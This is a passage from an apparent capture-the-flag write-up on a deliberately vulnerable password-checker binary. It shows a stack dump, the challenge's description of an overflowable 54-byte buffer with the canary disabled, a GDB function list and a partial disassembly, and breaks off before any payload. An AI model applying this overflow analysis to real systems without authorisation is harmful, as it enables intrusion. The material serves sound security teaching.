| 0x00007ffe0cc8fd68 (rsp+0x0358) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd70 (rsp+0x0360) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd78 (rsp+0x0368) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd80 (rsp+0x0370) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd88 (rsp+0x0378) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd90 (rsp+0x0380) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fd98 (rsp+0x0388) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fda0 (rsp+0x0390) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fda8 (rsp+0x0398) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdb0 (rsp+0x03a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdb8 (rsp+0x03a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdc0 (rsp+0x03b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdc8 (rsp+0x03b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdd0 (rsp+0x03c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdd8 (rsp+0x03c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fde0 (rsp+0x03d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fde8 (rsp+0x03d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdf0 (rsp+0x03e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fdf8 (rsp+0x03e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe00 (rsp+0x03f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe08 (rsp+0x03f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe10 (rsp+0x0400) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe18 (rsp+0x0408) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe20 (rsp+0x0410) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe28 (rsp+0x0418) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe30 (rsp+0x0420) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe38 (rsp+0x0428) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe40 (rsp+0x0430) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe48 (rsp+0x0438) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe50 (rsp+0x0440) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe58 (rsp+0x0448) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe60 (rsp+0x0450) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe68 (rsp+0x0458) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe70 (rsp+0x0460) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe78 (rsp+0x0468) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe80 (rsp+0x0470) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe88 (rsp+0x0478) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe90 (rsp+0x0480) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fe98 (rsp+0x0488) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fea0 (rsp+0x0490) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fea8 (rsp+0x0498) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8feb0 (rsp+0x04a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8feb8 (rsp+0x04a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fec0 (rsp+0x04b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fec8 (rsp+0x04b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fed0 (rsp+0x04c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fed8 (rsp+0x04c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fee0 (rsp+0x04d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fee8 (rsp+0x04d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fef0 (rsp+0x04e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fef8 (rsp+0x04e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff00 (rsp+0x04f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff08 (rsp+0x04f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff10 (rsp+0x0500) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff18 (rsp+0x0508) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff20 (rsp+0x0510) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff28 (rsp+0x0518) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff30 (rsp+0x0520) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff38 (rsp+0x0528) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff40 (rsp+0x0530) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff48 (rsp+0x0538) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff50 (rsp+0x0540) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff58 (rsp+0x0548) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff60 (rsp+0x0550) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff68 (rsp+0x0558) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff70 (rsp+0x0560) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff78 (rsp+0x0568) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff80 (rsp+0x0570) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff88 (rsp+0x0578) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff90 (rsp+0x0580) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ff98 (rsp+0x0588) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffa0 (rsp+0x0590) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffa8 (rsp+0x0598) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffb0 (rsp+0x05a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffb8 (rsp+0x05a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffc0 (rsp+0x05b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffc8 (rsp+0x05b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffd0 (rsp+0x05c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffd8 (rsp+0x05c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffe0 (rsp+0x05d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8ffe8 (rsp+0x05d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fff0 (rsp+0x05e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc8fff8 (rsp+0x05e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90000 (rsp+0x05f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90008 (rsp+0x05f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90010 (rsp+0x0600) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90018 (rsp+0x0608) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90020 (rsp+0x0610) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90028 (rsp+0x0618) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90030 (rsp+0x0620) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90038 (rsp+0x0628) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90040 (rsp+0x0630) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90048 (rsp+0x0638) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90050 (rsp+0x0640) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90058 (rsp+0x0648) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90060 (rsp+0x0650) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90068 (rsp+0x0658) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90070 (rsp+0x0660) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90078 (rsp+0x0668) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90080 (rsp+0x0670) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90088 (rsp+0x0678) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90090 (rsp+0x0680) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90098 (rsp+0x0688) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900a0 (rsp+0x0690) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900a8 (rsp+0x0698) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900b0 (rsp+0x06a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900b8 (rsp+0x06a8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900c0 (rsp+0x06b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900c8 (rsp+0x06b8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900d0 (rsp+0x06c0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900d8 (rsp+0x06c8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900e0 (rsp+0x06d0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900e8 (rsp+0x06d8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900f0 (rsp+0x06e0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc900f8 (rsp+0x06e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90100 (rsp+0x06f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90108 (rsp+0x06f8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90110 (rsp+0x0700) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90118 (rsp+0x0708) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90120 (rsp+0x0710) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90128 (rsp+0x0718) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90130 (rsp+0x0720) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90138 (rsp+0x0728) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90140 (rsp+0x0730) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90148 (rsp+0x0738) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90150 (rsp+0x0740) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90158 (rsp+0x0748) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90160 (rsp+0x0750) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90168 (rsp+0x0758) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90170 (rsp+0x0760) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90178 (rsp+0x0768) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90180 (rsp+0x0770) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90188 (rsp+0x0778) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0cc90190 (rsp+0x0780) | 00 00 00 00 00 00 d9 18 | 0x18d9000000000000 |
| 0x00007ffe0cc90198 (rsp+0x0788) | f3 27 ee 25 5f 78 00 00 | 0x0000785f25ee27f3 |
| 0x00007ffe0cc901a0 (rsp+0x0790) | 00 d2 e7 9b cf 5c 00 00 | 0x00005ccf9be7d200 |
| 0x00007ffe0cc901a8 (rsp+0x0798) | d0 12 c9 0c 03 00 00 00 | 0x000000030cc912d0 |
| 0x00007ffe0cc901b0 (rsp+0x07a0) | e0 11 c9 0c fe 7f 00 00 | 0x00007ffe0cc911e0 |
| 0x00007ffe0cc901b8 (rsp+0x07a8) | 1e e2 e7 9b cf 5c 00 00 | 0x00005ccf9be7e21e |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe0cc8fa10, and our base pointer points to 0x7ffe0cc901b0.
This means that we have (decimal) 246 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 1968 bytes.
The input buffer begins at 0x7ffe0cc8fa40, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 54 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

This challenge is a password checker that will check your input against a randomly generated password.
The password is stored at 0x7ffe0cc90196, 1878 bytes after the start of your input buffer.
We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
Payload size: 
```

Let's open the program within GDB.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001110  __cxa_finalize@plt
0x0000000000001120  putchar@plt
0x0000000000001130  __errno_location@plt
0x0000000000001140  puts@plt
0x0000000000001150  write@plt
0x0000000000001160  printf@plt
0x0000000000001170  geteuid@plt
0x0000000000001180  close@plt
0x0000000000001190  read@plt
0x00000000000011a0  strcmp@plt
0x00000000000011b0  setvbuf@plt
0x00000000000011c0  open@plt
0x00000000000011d0  __isoc99_scanf@plt
0x00000000000011e0  exit@plt
0x00000000000011f0  strerror@plt
0x0000000000001200  _start
0x0000000000001230  deregister_tm_clones
0x0000000000001260  register_tm_clones
0x00000000000012a0  __do_global_dtors_aux
0x00000000000012e0  frame_dummy
0x00000000000012e9  DUMP_STACK
0x00000000000014ec  bin_padding
0x0000000000001c17  win
0x0000000000001d1e  challenge
0x0000000000002198  main
0x0000000000002230  __libc_csu_init
0x00000000000022a0  __libc_csu_fini
0x00000000000022a8  _fini
```

## `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000001d1e <+0>:     endbr64
   0x0000000000001d22 <+4>:     push   rbp
   0x0000000000001d23 <+5>:     mov    rbp,rsp
   0x0000000000001d26 <+8>:     sub    rsp,0x7a0
   0x0000000000001d2d <+15>:    mov    DWORD PTR [rbp-0x784],edi
   0x0000000000001d33 <+21>:    mov    QWORD PTR [rbp-0x790],rsi
   0x0000000000001d3a <+28>:    mov    QWORD PTR [rbp-0x798],rdx
   0x0000000000001d41 <+35>:    lea    rdx,[rbp-0x770]
   0x0000000000001d48 <+42>:    mov    eax,0x0
   0x0000000000001d4d <+47>:    mov    ecx,0xeb
   0x0000000000001d52 <+52>:    mov    rdi,rdx
   0x0000000000001d55 <+55>:    rep stos QWORD PTR es:[rdi],rax
   0x0000000000001d58 <+58>:    mov    rdx,rdi
   0x0000000000001d5b <+61>:    mov    DWORD PTR [rdx],eax
   0x0000000000001d5d <+63>:    add    rdx,0x4
   0x0000000000001d61 <+67>:    mov    WORD PTR [rdx],ax
   0x0000000000001d64 <+70>:    add    rdx,0x2
   0x0000000000001d68 <+74>:    mov    esi,0x0
   0x0000000000001d6d <+79>:    lea    rdi,[rip+0x1480]        # 0x31f4
   0x0000000000001d74 <+86>:    mov    eax,0x0
   0x0000000000001d79 <+91>:    call   0x11c0 <open@plt>
   0x0000000000001d7e <+96>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000001d81 <+99>:    lea    rax,[rbp-0x770]
   0x0000000000001d88 <+106>:   lea    rcx,[rax+0x756]
   0x0000000000001d8f <+113>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001d92 <+116>:   mov    edx,0x8
   0x0000000000001d97 <+121>:   mov    rsi,rcx
   0x0000000000001d9a <+124>:   mov    edi,eax
   0x0000000000001d9c <+126>:   call   0x1190 <read@plt>
   0x0000000000001da1 <+131>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001da4 <+134>:   mov    edi,eax
   0x0000000000001da6 <+136>:   call   0x1180 <close@plt>
   0x0000000000001dab <+141>:   mov    QWORD PTR [rbp-0x778],0x0
   0x0000000000001db6 <+152>:   lea    rdi,[rip+0x144b]        # 0x3208
   0x0000000000001dbd <+159>:   call   0x1140 <puts@plt>
   0x0000000000001dc2 <+164>:   mov    rax,rsp
   0x0000000000001dc5 <+167>:   mov    QWORD PTR [rip+0x33cc],rax        # 0x5198 <sp_>
   0x0000000000001dcc <+174>:   mov    rax,rbp
   0x0000000000001dcf <+177>:   mov    QWORD PTR [rip+0x33a2],rax        # 0x5178 <bp_>
   0x0000000000001dd6 <+184>:   mov    rdx,QWORD PTR [rip+0x339b]        # 0x5178 <bp_>
   0x0000000000001ddd <+191>:   mov    rax,QWORD PTR [rip+0x33b4]        # 0x5198 <sp_>
   0x0000000000001de4 <+198>:   sub    rdx,rax
   0x0000000000001de7 <+201>:   mov    rax,rdx
   0x0000000000001dea <+204>:   shr    rax,0x3
   0x0000000000001dee <+208>:   add    rax,0x2
   0x0000000000001df2 <+212>:   mov    QWORD PTR [rip+0x338f],rax        # 0x5188 <sz_>
   0x0000000000001df9 <+219>:   mov    rax,QWORD PTR [rip+0x3378]        # 0x5178 <bp_>
   0x0000000000001e00 <+226>:   add    rax,0x8
   0x0000000000001e04 <+230>:   mov    QWORD PTR [rip+0x3385],rax        # 0x5190 <rp_>
   0x0000000000001e0b <+237>:   lea    rdi,[rip+0x142e]        # 0x3240
   0x0000000000001e12 <+244>:   call   0x1140 <puts@plt>
   0x0000000000001e17 <+249>:   mov    rdx,QWORD PTR [rip+0x336a]        # 0x5188 <sz_>
   0x0000000000001e1e <+256>:   mov    rax,QWORD PTR [rip+0x3373]        # 0x5198 <sp_>
   0x0000000000001e25 <+263>:   mov    rsi,rdx
   0x0000000000001e28 <+266>:   mov    rdi,rax
   0x0000000000001e2b <+269>:   call   0x12e9 <DUMP_STACK>
   0x0000000000001e30 <+274>:   mov    rdx,QWORD PTR [rip+0x3341]        # 0x5178 <bp_>
   0x0000000000001e37 <+281>:   mov    rax,QWORD PTR [rip+0x335a]        # 0x5198 <sp_>
   0x0000000000001e3e <+288>:   mov    rsi,rax
   0x0000000000001e41 <+291>:   lea    rdi,[rip+0x1440]        # 0x3288
   0x0000000000001e48 <+298>:   mov    eax,0x0
   0x0000000000001e4d <+303>:   call   0x1160 <printf@plt>
   0x0000000000001e52 <+308>:   mov    rax,QWORD PTR [rip+0x332f]        # 0x5188 <sz_>
   0x0000000000001e59 <+315>:   mov    rsi,rax
   0x0000000000001e5c <+318>:   lea    rdi,[rip+0x146d]        # 0x32d0
   0x0000000000001e63 <+325>:   mov    eax,0x0
   0x0000000000001e68 <+330>:   call   0x1160 <printf@plt>
   0x0000000000001e6d <+335>:   lea    rdi,[rip+0x14a4]        # 0x3318
   0x0000000000001e74 <+342>:   call   0x1140 <puts@plt>
   0x0000000000001e79 <+347>:   mov    rax,QWORD PTR [rip+0x3308]        # 0x5188 <sz_>
   0x0000000000001e80 <+354>:   shl    rax,0x3
   0x0000000000001e84 <+358>:   mov    rsi,rax
   0x0000000000001e87 <+361>:   lea    rdi,[rip+0x14cf]        # 0x335d
   0x0000000000001e8e <+368>:   mov    eax,0x0
   0x0000000000001e93 <+373>:   call   0x1160 <printf@plt>
   0x0000000000001e98 <+378>:   lea    rax,[rbp-0x770]
   0x0000000000001e9f <+385>:   mov    rsi,rax
   0x0000000000001ea2 <+388>:   lea    rdi,[rip+0x14cf]        # 0x3378
   0x0000000000001ea9 <+395>:   mov    eax,0x0
   0x0000000000001eae <+400>:   call   0x1160 <printf@plt>
   0x0000000000001eb3 <+405>:   lea    rdi,[rip+0x1506]        # 0x33c0
   0x0000000000001eba <+412>:   call   0x1140 <puts@plt>
   0x0000000000001ebf <+417>:   lea    rdi,[rip+0x154a]        # 0x3410
   0x0000000000001ec6 <+424>:   call   0x1140 <puts@plt>
   0x0000000000001ecb <+429>:   mov    esi,0x36
   0x0000000000001ed0 <+434>:   lea    rdi,[rip+0x1569]        # 0x3440
   0x0000000000001ed7 <+441>:   mov    eax,0x0
   0x0000000000001edc <+446>:   call   0x1160 <printf@plt>
   0x0000000000001ee1 <+451>:   lea    rdi,[rip+0x15b0]        # 0x3498
   0x0000000000001ee8 <+458>:   call   0x1140 <puts@plt>
   0x0000000000001eed <+463>:   lea    rdi,[rip+0x15dc]        # 0x34d0
   0x0000000000001ef4 <+470>:   call   0x1140 <puts@plt>
   0x0000000000001ef9 <+475>:   lea    rax,[rbp-0x770]
   0x0000000000001f00 <+482>:   add    rax,0x756
   0x0000000000001f06 <+488>:   mov    edx,0x756
   0x0000000000001f0b <+493>:   mov    rsi,rax
   0x0000000000001f0e <+496>:   lea    rdi,[rip+0x1623]        # 0x3538
   0x0000000000001f15 <+503>:   mov    eax,0x0
   0x0000000000001f1a <+508>:   call   0x1160 <printf@plt>
   0x0000000000001f1f <+513>:   lea    rdi,[rip+0x1662]        # 0x3588
   0x0000000000001f26 <+520>:   call   0x1140 <puts@plt>
   0x0000000000001f2b <+525>:   lea    rdi,[rip+0x16b6]        # 0x35e8
   0x0000000000001f32 <+532>:   call   0x1140 <puts@plt>
   0x0000000000001f37 <+537>:   lea    rdi,[rip+0x16ea]        # 0x3628
   0x0000000000001f3e <+544>:   call   0x1140 <puts@plt>
   0x0000000000001f43 <+549>:   lea    rdi,[rip+0x171b]        # 0x3665
   0x0000000000001f4a <+556>:   mov    eax,0x0
   0x0000000000001f4f <+561>:   call   0x1160 <printf@plt>
   0x0000000000001f54 <+566>:   lea    rax,[rbp-0x778]
   0x0000000000001f5b <+573>:   mov    rsi,rax
   0x0000000000001f5e <+576>:   lea    rdi,[rip+0x170f]        # 0x3674
   0x0000000000001f65 <+583>:   mov    eax,0x0
   0x0000000000001f6a <+588>:   call   0x11d0 <__isoc99_scanf@plt>
   0x0000000000001f6f <+593>:   mov    rax,QWORD PTR [rbp-0x778]
   0x0000000000001f76 <+600>:   mov    rsi,rax
   0x0000000000001f79 <+603>:   lea    rdi,[rip+0x16f8]        # 0x3678
   0x0000000000001f80 <+610>:   mov    eax,0x0
   0x0000000000001f85 <+615>:   call   0x1160 <printf@plt>
   0x0000000000001f8a <+620>:   lea    rax,[rbp-0x770]
   0x0000000000001f91 <+627>:   mov    rsi,rax
   0x0000000000001f94 <+630>:   lea    rdi,[rip+0x170d]        # 0x36a8
   0x0000000000001f9b <+637>:   mov    eax,0x0
   0x0000000000001fa0 <+642>:   call   0x1160 <printf@plt>
   0x0000000000001fa5 <+647>:   mov    rax,QWORD PTR [rbp-0x778]
   0x0000000000001fac <+654>:   lea    rdx,[rax-0x36]
   0x0000000000001fb0 <+658>:   lea    rcx,[rbp-0x770]
   0x0000000000001fb7 <+665>:   mov    rax,QWORD PTR [rbp-0x778]
   0x0000000000001fbe <+672>:   add    rax,rcx
   0x0000000000001fc1 <+675>:   mov    rsi,rax
   0x0000000000001fc4 <+678>:   lea    rdi,[rip+0x1725]        # 0x36f0
   0x0000000000001fcb <+685>:   mov    eax,0x0
   0x0000000000001fd0 <+690>:   call   0x1160 <printf@plt>
   0x0000000000001fd5 <+695>:   mov    rax,QWORD PTR [rbp-0x778]
   0x0000000000001fdc <+702>:   mov    rsi,rax
   0x0000000000001fdf <+705>:   lea    rdi,[rip+0x1762]        # 0x3748
   0x0000000000001fe6 <+712>:   mov    eax,0x0
   0x0000000000001feb <+717>:   call   0x1160 <printf@plt>
   0x0000000000001ff0 <+722>:   mov    rdx,QWORD PTR [rbp-0x778]
   0x0000000000001ff7 <+729>:   lea    rax,[rbp-0x770]
   0x0000000000001ffe <+736>:   mov    rsi,rax
   0x0000000000002001 <+739>:   mov    edi,0x0
   0x0000000000002006 <+744>:   call   0x1190 <read@plt>
   0x000000000000200b <+749>:   mov    DWORD PTR [rbp-0x8],eax
   0x000000000000200e <+752>:   cmp    DWORD PTR [rbp-0x8],0x0
   0x0000000000002012 <+756>:   jns    0x2040 <challenge+802>
   0x0000000000002014 <+758>:   call   0x1130 <__errno_location@plt>
   0x0000000000002019 <+763>:   mov    eax,DWORD PTR [rax]
   0x000000000000201b <+765>:   mov    edi,eax
   0x000000000000201d <+767>:   call   0x11f0 <strerror@plt>
   0x0000000000002022 <+772>:   mov    rsi,rax
   0x0000000000002025 <+775>:   lea    rdi,[rip+0x1744]        # 0x3770
   0x000000000000202c <+782>:   mov    eax,0x0
   0x0000000000002031 <+787>:   call   0x1160 <printf@plt>
   0x0000000000002036 <+792>:   mov    edi,0x1
   0x000000000000203b <+797>:   call   0x11e0 <exit@plt>
   0x0000000000002040 <+802>:   mov    eax,DWORD PTR [rbp-0x8]
   0x0000000000002043 <+805>:   mov    esi,eax
   0x0000000000002045 <+807>:   lea    rdi,[rip+0x1748]        # 0x3794
   0x000000000000204c <+814>:   mov    eax,0x0
   0x0000000000002051 <+819>:   call   0x1160 <printf@plt>
   0x0000000000002056 <+824>:   lea    rdi,[rip+0x174b]        # 0x37a8
   0x000000000000205d <+831>:   call   0x1140 <puts@plt>
   0x0000000000002062 <+836>:   mov    rdx,QWORD PTR [rip+0x311f]        # 0x5188 <sz_>
   0x0000000000002069 <+843>:   mov    rax,QWORD PTR [rip+0x3128]        # 0x5198 <sp_>
   0x0000000000002070 <+850>:   mov    rsi,rdx
   0x0000000000002073 <+853>:   mov    rdi,rax
   0x0000000000002076 <+856>:   call   0x12e9 <DUMP_STACK>
   0x000000000000207b <+861>:   lea    rdi,[rip+0x174f]        # 0x37d1
   0x0000000000002082 <+868>:   call   0x1140 <puts@plt>
   0x0000000000002087 <+873>:   lea    rax,[rbp-0x770]
   0x000000000000208e <+880>:   mov    rsi,rax
   0x0000000000002091 <+883>:   lea    rdi,[rip+0x1758]        # 0x37f0
   0x0000000000002098 <+890>:   mov    eax,0x0
   0x000000000000209d <+895>:   call   0x1160 <printf@plt>
   0x00000000000020a2 <+900>:   lea    rax,[rbp-0x770]
